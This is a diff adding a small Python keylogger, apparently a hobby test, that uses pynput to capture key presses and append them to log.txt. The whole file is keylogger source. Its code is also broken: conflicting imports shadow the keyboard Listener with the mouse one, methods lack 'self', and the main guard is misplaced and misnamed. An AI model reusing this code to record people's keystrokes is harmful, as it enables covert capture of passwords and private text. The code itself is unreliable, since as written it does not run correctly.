@@ -1,0 +1,32 @@
+from pynput.keyboard import Listener
+from pynput.keyboard import Controller
+from pynput.mouse import Listener
+from pynput.mouse import Controller
+class keylogtest:
+
+	def wtf(key):
+		lst=[];
+		ks=(str(key).replace("'",""));
+		if(ks=='Key.space'):
+			ks=' ';
+		elif(ks=='Key.backspace'):
+			ks='-1';
+		elif(ks=='Key.delete'):
+			ks='-1';
+		elif(ks=='ctrl+z'):
+			ks='-1';
+		elif(ks=='ctrl+y'):
+			ks='-1';
+		elif(ks=='Key.enter'):
+			ks=' ';
+		lst.append(ks);
+		with open("log.txt", 'a') as fl:
+			fl.write(ks);
+	
+	def main():
+		obj=keylogtest();
+		with Listener(on_press=(obj.wtf)) as listen: #saving instance of Listener(...) as listen
+			listen.join(); 
+		
+		if (__name__=='main'):
+			main();
